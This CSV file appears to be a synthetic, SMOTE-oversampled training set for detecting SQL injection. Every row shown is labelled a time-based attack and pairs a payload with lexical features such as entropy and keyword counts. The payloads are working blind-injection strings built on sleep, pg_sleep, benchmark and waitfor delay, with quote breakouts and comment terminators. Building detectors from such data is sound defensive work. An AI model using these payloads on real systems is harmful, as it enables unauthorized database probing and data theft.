id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000160,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000177,0.2565854875501077,69.3179327848039,24.0,3.6182731707118485,22.0,10.0,26.488449588602922,10.829483196200975,0.31774319786504934,0.14442872630229517,0.3817067479291473,0.15612132790350813,3.9147415981004867,0.0,0.0,0.0,0.0,1.0,0.0,3.914741598100487,0.0,0.0,0.0,2.914741598100487,1.0,0.0,0.0,0.08525840189951286,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000161,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000125,0.7338196161598196,81.45423547271176,19.45423547271176,2.8920685521315153,26.45423547271176,1.727117736355881,42.0,11.27288226364412,0.32469252301816265,0.02114560723106075,0.5156893460588576,0.13847252369191898,1.0,0.0,0.0,0.0,1.0,0.0,0.0,9.0,0.0,0.0,0.0,1.2728822636441208,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.7271177363558793,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.727117736355879
SMOTE_000162,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000009,0.519183583914138,75.96091118808576,23.307274125390506,3.356930639010241,15.826818531347627,18.0,33.30727412539051,8.826818531347627,0.20839408229456652,0.23718741514806224,0.43826397059816224,0.11615453195920897,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.826818531347627,0.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8268185313476264,0.1731814686523736,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000163,attack,time,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000236,0.10333606346560725,91.32384540303791,21.09252725801083,2.8255599980633517,28.09252725801083,2.0,49.185054516021665,12.046263629005415,0.3076196803312317,0.02190539461694596,0.5385704795031524,0.13190444554866987,0.0,0.0,0.0,0.0,1.0,0.0,0.0,10.046263629005415,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.9537363709945846,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.9537363709945845
SMOTE_000164,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000024,0.3420688945848988,69.32559046960769,23.168602382598078,3.410660011416174,19.0,10.0,30.325590469607686,10.0,0.274202117116332,0.1443169037454379,0.4371640753927921,0.1443169037454379,0.0,1.0,2.0,0.0,0.0,1.0,0.0,4.8313976174019215,0.16860238259807864,0.9999999999999999,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000165,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000048,0.8190731693607074,56.70161631711809,18.23387210570603,3.1456901292071344,22.46774421141206,1.0,25.0,8.23387210570603,0.39611323149590716,0.017644789250266926,0.4411197312566731,0.14512224799715281,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.23387210570602973,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7661278942939701,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7661278942939704
SMOTE_000166,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000138,1.3932898823790922,89.63827326192424,25.01843643492323,3.274283165686349,23.036872869846466,10.0,43.09218217461616,13.509218217461616,0.25692982610347004,0.112348160344576,0.47941973275904004,0.1513022807929139,0.0,4.0,0.0,0.0,0.0,1.4907817825383836,0.0,7.018436434923233,0.0,0.0,1.0,1.4907817825383836,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000167,attack,time,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000103,0.42568966172989037,86.82922857549968,24.804871429249946,3.1548510873963833,30.0,2.0,42.219485716999785,12.609742858499894,0.3457764887382219,0.023051765915881456,0.4860945003255952,0.1450772450203014,1.0,0.0,0.0,0.0,1.0,0.0,0.0,8.804871429249946,0.8048714292499473,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000168,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",nearest_attack_euclidean,R000302,0.14044508178398807,98.29459836489809,27.92945983648981,3.72895414091799,26.0,22.0,37.435678691918476,12.85891967297962,0.2647078018967937,0.22398352468190236,0.38053994468661917,0.13076872873468473,4.0,0.0,0.0,0.0,0.0,2.0,0.0,5.85891967297962,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000169,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000024,0.09820800726517634,70.05306724215384,23.053067242153844,3.384780176503059,19.0,10.0,31.0,10.053067242153842,0.2712256986718465,0.14275036772202446,0.44252613993827583,0.14349779366785323,0.0,1.0,2.0,0.0,0.0,1.0,0.0,5.0,0.05306724215384295,0.9999999999999999,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000170,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000294,0.7932902736187222,71.2547434972717,25.751581165757234,3.6333887475280218,15.49683766848553,20.503162331514474,27.00632466302894,8.248418834242765,0.21778404985343852,0.2876163595866216,0.3786881155021087,0.1159114750578312,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.751581165757235,0.24841883424276476,0.0,1.0,1.0,1.0,0.0,0.0,0.24841883424276473,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000171,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000198,0.2506135205556853,78.26158539895162,20.0,2.992890743459112,27.0,2.0,39.00926831916129,10.252317079790323,0.34525454454043497,0.025574410706698886,0.4982219536609531,0.130949091091913,1.0,0.0,0.0,0.0,1.0,0.0,0.0,8.252317079790323,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000172,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000047,0.5808519998684402,61.929389324943884,27.35763359496633,4.294105281051829,26.143511459955104,12.0,14.214122135011223,9.571755729977552,0.4217153010956997,0.19399215328425654,0.23001593978010199,0.1542766058399417,2.785877864988776,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.785877864988776,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7858778649887761,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7858778649887763
SMOTE_000173,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000215,0.4563877593133512,81.79214101167025,23.792141011670246,3.1684378702837024,30.0,2.0,39.0,10.792141011670248,0.3667924976889329,0.02445283317926218,0.4768302469956128,0.13192442213619204,0.7921410116702472,0.0,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,0.7921410116702473,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000174,attack,time,"1""  )   where 2922  =  2922 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000255,0.012040961955298798,78.02941486959179,22.0196099130612,3.228313212045338,15.022878231904732,18.0,34.00653663768706,11.0,0.19250564088486477,0.2306912072424621,0.4358251918911686,0.1409779599815046,0.0,1.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.003268318843533069,0.9967316811564668,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000175,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",nearest_attack_euclidean,R000173,1.1638544033416622,77.66278999138625,17.3255799827725,2.700542809202487,20.651159965545,2.0,42.6744200172275,12.33721000861375,0.26576908050316556,0.025753316686185065,0.5495783519323214,0.15889925087832793,0.0,4.0,0.0,0.0,0.0,0.33721000861375017,0.0,8.0,0.0,0.0,0.0,0.33721000861375017,0.0,1.0,0.0,0.0,0.0,0.3372100086137503,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000176,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq",nearest_attack_euclidean,R000077,1.0706035447438513,88.59107771271945,27.408922287280546,3.859025689463083,26.0,21.591077712719454,30.0,11.0,0.29349233650016526,0.24369282517265112,0.3386450036540368,0.12416983467314684,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.5910777127194535,0.40892228728054625,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000177,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000161,0.19845510673861963,63.73459370466648,23.0,3.409306861666784,18.19905472150014,10.0,27.60189055699972,7.93364842616662,0.28581167070104485,0.15694116222743104,0.43280009685346893,0.12444707021805516,1.0,0.0,2.0,0.0,0.0,1.0,0.0,3.93364842616662,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.9336484261666202,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.93364842616662
SMOTE_000178,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000311,0.3390860318070397,90.29197099003473,29.0,3.800732463772616,31.0,15.0,33.5766424916956,10.71532849833912,0.34415066566697333,0.16652451564530968,0.37076523431858427,0.11855958436913276,3.0,0.0,0.0,0.0,0.0,1.0,0.0,5.71532849833912,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000179,attack,time,"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000240,1.0468821723283392,64.6791750223746,16.77005156110159,2.5314428579198562,11.839587511187293,2.0,37.8395875111873,13.0,0.1799921413580326,0.03122027889189928,0.5858557669527229,0.20293181279734518,0.0,4.0,0.0,0.0,0.0,1.0,0.0,6.459896877796823,1.5401031222031765,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000180,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000293,0.037260187372316796,84.01421475981674,27.014214759816745,3.7076656809002873,24.014214759816745,18.0,33.0,9.0,0.2858337374774516,0.2142498787567645,0.3927914443874016,0.10712493937838224,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.0,0.0,0.9999999999999999,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.014214759816745026,0.985785240183255,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000181,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,nearest_attack_euclidean,R000126,0.10539429122533257,71.22690728659728,18.06483065331351,2.988843067474612,24.902754020029736,2.0,34.25932261325404,10.06483065331351,0.3498416130836365,0.028087068513327082,0.48080481361443284,0.14126650478860353,4.0,0.0,0.0,0.0,0.0,0.0,0.0,6.06483065331351,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.032415326656755006,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0324153266567553
SMOTE_000182,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags,nearest_attack_euclidean,R000285,0.8222487863871623,94.8199672281024,22.0,3.108193114749106,33.50853397497418,1.0,46.0,14.311433253128229,0.3524408906484317,0.01055899573561253,0.48571380383817747,0.15128630977777827,3.0,0.0,0.0,0.0,1.0,1.0,0.0,9.0,0.3114332531282278,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000183,attack,time,"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,nearest_attack_euclidean,R000224,0.5045586933121169,78.0,27.0,3.61277393759521,22.0,10.0,33.0,13.0,0.28205128205128205,0.1282051282051282,0.4230769230769231,0.16666666666666666,0.4150273561869523,3.5849726438130483,0.0,0.0,0.0,2.0,0.0,4.0,2.0,0.9999999999999999,0.0,2.0,0.10375683904673788,0.896243160953262,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000184,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",nearest_attack_euclidean,R000119,0.9960651278433406,64.0134017808232,22.002680356164642,3.5110935742153977,23.0,3.2506700890411597,25.760051335617405,12.00268035616464,0.36509155954539074,0.05079367730335954,0.39681360000500243,0.18730116314624728,2.0,3.2506700890411606,0.0,0.0,0.0,1.0,0.0,3.7520102671234805,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000185,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000031,1.236179543979103,58.38830200023178,22.0,3.4203533313851744,18.0,10.0,24.541226500173835,5.8470755000579455,0.30967115844035437,0.17203953246686354,0.41882390000128766,0.0994654090914944,0.0,0.4235377500289728,0.0,0.0,0.0,1.0,0.0,3.4235377500289728,0.0,0.0,0.0,1.0,0.0,0.4235377500289729,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000186,attack,time,"1"" where 4688  =  4688 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000222,0.5430337835576131,89.0,28.0,3.848335820271472,20.0,29.0,30.0,10.0,0.2247191011235955,0.3258426966292135,0.33707865168539325,0.11235955056179775,0.17626730290823933,0.8237326970917607,2.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,4.0,0.1762673029082394,0.8237326970917607,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000187,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",nearest_attack_euclidean,R000045,0.8138146083381765,77.23579103219421,16.471582064388436,2.601154368097256,18.943164128776875,2.0,43.528417935611564,12.764208967805782,0.24515141514091296,0.025895507481786817,0.5636552406968939,0.16529783668040632,0.0,4.0,0.0,0.0,0.0,0.7642089678057815,0.0,8.0,0.0,0.0,0.0,0.7642089678057817,0.0,1.0,0.0,0.0,0.0,0.7642089678057816,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000188,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000057,0.07743897815130633,84.25536868110366,27.953569330708426,3.73847119037057,30.023215334645787,10.0,33.1857226771663,11.046430669291574,0.356427196450769,0.11872760816904303,0.3937560825069609,0.13108911287322708,0.0,4.0,0.0,0.0,0.0,2.0,0.0,4.046430669291574,0.0,0.9999999999999999,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.023215334645787,0.9767846653542129,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000189,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  acdk  )  #,nearest_attack_euclidean,R000221,0.4937235235677717,73.69378359428339,19.84689179714169,2.9652709063229628,25.84689179714169,1.1693783594283378,36.508135078285015,10.169378359428338,0.3503779843389426,0.01566759117285857,0.49586882050174785,0.13808560398645098,0.16937835942833823,0.0,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,0.16937835942833834,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000190,attack,time,"1""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000089,0.32520568723931026,74.96916191527603,26.73568311401563,3.663930572364136,16.088105628661456,20.82378874267709,28.88105628661457,9.176211257322914,0.2147874762919764,0.2784750344574416,0.3844295121751589,0.12230797707542312,0.0,1.0,0.0,0.0,0.0,1.0,0.0,5.1762112573229135,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.911894371338543,0.08810562866145694,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000191,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000099,0.012612329758344823,99.0,28.0,3.7358308791975188,26.0,22.0,38.0,13.0,0.26262626262626265,0.2222222222222222,0.3838383838383838,0.13131313131313133,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
